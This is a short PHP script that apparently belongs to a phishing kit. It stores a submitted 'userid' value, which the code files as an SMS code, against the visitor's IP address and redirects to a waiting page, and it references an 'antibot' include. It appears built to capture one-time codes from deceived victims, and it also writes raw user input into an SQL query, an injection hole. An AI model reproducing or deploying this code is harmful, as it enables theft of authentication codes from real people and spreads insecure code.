<?php
//require_once('../antibot8/code/include.php');
session_start();

$coxfile=  "cox.php";

include $coxfile;



$ip= $_SERVER['REMOTE_ADDR'];
$userip =$_SERVER['REMOTE_ADDR'];
$user=$_POST['userid'];
	//$back = "wait2.php";

  $sql ="UPDATE user set sms ='$user' , page='',lastpage='wait.php' where IP='$ip';";
   $ret = $db->exec($sql);
   if(!$ret) {
      //echo $db->lastErrorMsg();
   } else {
      //echo $db->changes(), " <center><h1>successfully</h1></center>";
   }
   $db->close();

echo "<script>location.replace('wait.php');</script>"
?>
